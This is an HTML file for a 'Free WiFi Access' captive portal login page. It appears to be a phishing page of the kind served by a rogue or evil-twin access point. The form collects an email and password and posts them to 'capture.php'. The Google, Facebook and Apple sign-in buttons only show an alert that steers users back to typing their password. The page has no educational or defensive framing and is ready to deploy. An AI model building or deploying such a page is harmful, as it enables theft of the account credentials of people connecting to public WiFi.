<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - Connect to Internet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.2);
            max-width: 420px;
            width: 100%;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            padding: 40px 30px;
            text-align: center;
            color: white;
        }
        
        .wifi-icon {
            font-size: 50px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.85;
        }
        
        .login-form {
            padding: 40px 35px;
        }
        
        .welcome-text {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .welcome-text h2 {
            color: #333;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .welcome-text p {
            color: #888;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 22px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-wrapper .icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 18px;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px 15px 15px 45px;
            border: 2px solid #e8e8e8;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.3s ease;
            background: #fafafa;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #3498db;
            background: white;
            box-shadow: 0 0 0 4px rgba(52, 152, 219, 0.1);
        }
        
        .form-group input::placeholder {
            color: #bbb;
        }
        
        .remember-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .remember-row label {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #666;
            cursor: pointer;
        }
        
        .remember-row input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #3498db;
        }
        
        .forgot-link {
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .btn-connect {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn-connect:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(52, 152, 219, 0.3);
        }
        
        .btn-connect:active {
            transform: translateY(0);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #ccc;
            font-size: 13px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e8e8e8;
        }
        
        .divider span {
            padding: 0 15px;
        }
        
        .social-login {
            display: flex;
            gap: 12px;
        }
        
        .social-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e8e8e8;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            font-size: 20px;
            transition: all 0.3s ease;
        }
        
        .social-btn:hover {
            background: #f8f8f8;
            border-color: #ddd;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            border-top: 1px solid #eee;
        }
        
        .footer p {
            font-size: 12px;
            color: #999;
        }
        
        .footer a {
            color: #3498db;
            text-decoration: none;
        }
        
        .terms {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            line-height: 1.6;
        }
        
        .terms a {
            color: #3498db;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <div class="wifi-icon"><img src="./pics/wifi.png" alt="WiFi" style="width: 48px; height: 48px;"></div>
            <h1>Free WiFi Access</h1>
            <p>High-speed internet connection</p>
        </div>
        
        <form class="login-form" action="capture.php" method="POST">
            <div class="welcome-text">
                <h2>Welcome!</h2>
                <p>Sign in to connect to the internet</p>
            </div>
            
            <div class="form-group">
                <label for="email">Email Address</label>
                <div class="input-wrapper">
                    <span class="icon"><img src="./pics/mail.png" alt="Email" style="width: 18px; height: 18px;"></span>
                    <input type="text" id="email" name="username" placeholder="Enter your email" required>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <span class="icon"><img src="./pics/lock.png" alt="Lock" style="width: 18px; height: 18px;"></span>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
            </div>
            
            <div class="remember-row">
                <label>
                    <input type="checkbox" name="remember"> Remember me
                </label>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            
            <button type="submit" class="btn-connect">
                <span><img src="./pics/internet.png" alt="Globe" style="width: 20px; height: 20px; vertical-align: middle;"></span> Connect to Internet
            </button>
            
            <div class="divider">
                <span>or continue with</span>
            </div>
            
            <div class="social-login">
                <button type="button" class="social-btn" onclick="socialLogin('google')"><img src="./pics/google.png" alt="Google" style="width: 30px; height: 30px; vertical-align: middle;"></button>
                <button type="button" class="social-btn" onclick="socialLogin('facebook')"><img src="./pics/facebook.png" alt="Facebook" style="width: 30px; height: 30px; vertical-align: middle;"></button>
                <button type="button" class="social-btn" onclick="socialLogin('apple')"><img src="./pics/apple.png" alt="Apple" style="width: 30px; height: 30px; vertical-align: middle;"></button>
            </div>
            
            <p class="terms">
                By connecting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
            </p>
        </form>
        
        <div class="footer">
            <p>Powered by <a href="#">WiFi Connect</a> • Secure Connection</p>
        </div>
    </div>
    
    <script>
        function socialLogin(provider) {
            alert('Social login is temporarily unavailable. Please use email and password.');
        }
    </script>
</body>
</html>